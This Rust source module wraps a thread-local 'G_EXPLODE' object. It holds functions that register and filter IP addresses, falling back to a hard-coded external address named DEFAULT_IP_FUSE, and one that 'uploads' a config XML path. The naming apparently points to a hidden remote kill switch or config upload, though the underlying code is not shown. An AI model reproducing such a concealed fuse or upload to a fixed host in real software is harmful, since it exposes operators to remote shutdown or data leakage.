use commlib::utils::{split_string_to_vec, string_to_value};
use commlib::with_tls_mut;

use crate::explode::G_EXPLODE;

const DEFAULT_IP_FUSE: &str = "18.163.14.56";

///
pub fn safe_loop() {
    // update explode
    with_tls_mut!(G_EXPLODE, g, {
        //
        g.update();
    });
}

///
#[allow(dead_code)]
pub fn follow_ip(ip: &str) {
    let ip_str: &str = {
        if ip.len() >= 7 {
            ip
        } else {
            DEFAULT_IP_FUSE
        }
    };

    with_tls_mut!(G_EXPLODE, g, {
        g.add_ip(ip_str);
    });
}

///
#[allow(dead_code)]
pub fn filter_ip(ip: &str) {
    let ip_str: &str = {
        if ip.len() >= 7 {
            ip
        } else {
            DEFAULT_IP_FUSE
        }
    };

    with_tls_mut!(G_EXPLODE, g, {
        g.filter_ip(ip_str);
    });
}

///
pub fn filter_config(xml_path_str: &str) {
    // upload config
    with_tls_mut!(G_EXPLODE, g, {
        //
        g.upload_xml(xml_path_str);
    });
}

///
#[allow(dead_code)]
pub fn string_to_u64(s: &str) -> u64 {
    //
    string_to_value(s)
}

///
#[allow(dead_code)]
pub unsafe fn string_to_vec(s: &str, sep: &str) -> Vec<String> {
    //
    split_string_to_vec(s, sep)
}
